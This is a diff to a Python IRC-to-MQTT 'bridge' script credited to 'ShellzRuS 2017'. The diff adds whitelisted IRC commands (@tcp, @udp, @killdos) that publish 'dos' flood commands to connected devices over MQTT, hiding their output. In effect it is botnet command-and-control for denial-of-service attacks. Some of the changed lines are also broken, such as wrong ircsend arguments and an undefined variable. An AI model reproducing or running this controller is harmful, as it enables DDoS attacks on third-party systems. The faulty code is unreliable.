@@ -15,7 +15,7 @@ print("""
                         |'/      |_|                  `   
                         |/
                         
-                   ~ MqTT <---> IRC Proxy ~
+                   ~ MqTT-IRC Bridge ~
                        ShellzRuS 2017
 """)
 import socket,string,time,re,binascii,base64,operator,json,argparse,sys
@@ -128,7 +128,7 @@ def devoice(to_dv, chan):
 
 def mode(user, flags):
     if verbose or debug: print("Mode %s:%s" % (user,flags))
-    ircsend( 'MODE ' + user + " " + flags)
+    ircsend( 'MODE ', user + " ",flags)
 
 # Called after first pong
 def init_irc(CHANNEL_,KEY_,irc_auth_):
@@ -152,6 +152,9 @@ def connect_irc(_irc_auth,_key):
     ircsend("NICK",NICK,null)
     ircsend("USER",IDENT+" "+HOST+" "+"8 :"+REALNAME,null)
     time.sleep(2)
+    if KEY != "lolololol":
+        CHANNEL = CHANNEL + " " + KEY
+    join_chan(irc_chan+" "+KEY)
 
 def part_chan(CHANNEL_):
     if verbose:
@@ -541,6 +544,62 @@ def listen_irc(irc_auth,chan_key,dispass,priv_user,CHANNEL):
                     if verbose:
                         print("Shutting down...")
                     quit_irc(sender)
+                # ddos commands
+                elif re.match(r'^:@tcp.*$', line[3]):
+                    if not enabled:
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    if not bot_whitelist(sender, action):
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    scount+=1
+                    if debug or verbose:
+                        print("Received tcp dos command: %s from %s" % (final,sender))
+                    try:
+                        mqsend("dos -t %s >/dev/null 2>&1" % final)
+                    except Exception as e:
+                        s.send("%s %s :Error publishing message\n" % (action,sender))
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
+                elif re.match(r'^:@udp.*$', line[3]):
+                    if not enabled:
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    if not bot_whitelist(sender, action):
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    scount+=1
+                    if debug or verbose:
+                        print("Received udp dos command: %s from %s" % (final,sender))
+                    try:
+                        mqsend("dos -u %s >/dev/null 2>&1" % final)
+                    except Exception as e:
+                        ircsend(action,sender,"Error publishing message")
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
+                elif re.match(r'^:@killdos.*$', line[3]):
+                    if not enabled:
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    if not bot_whitelist(sender, action):
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    scount+=1
+                    if verbose or debug:
+                        print("Received a kill from %s, killing all attacks" % sender)
+                    ircsend(action,sender,"Killing all attacks")
+                    try:
+                        mqsend("dos -k >/dev/null 2>&1")
+                    except Exception as e:
+                        ircsend(action,sender,"Error publishing message")
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
                 else:
                     pass
 
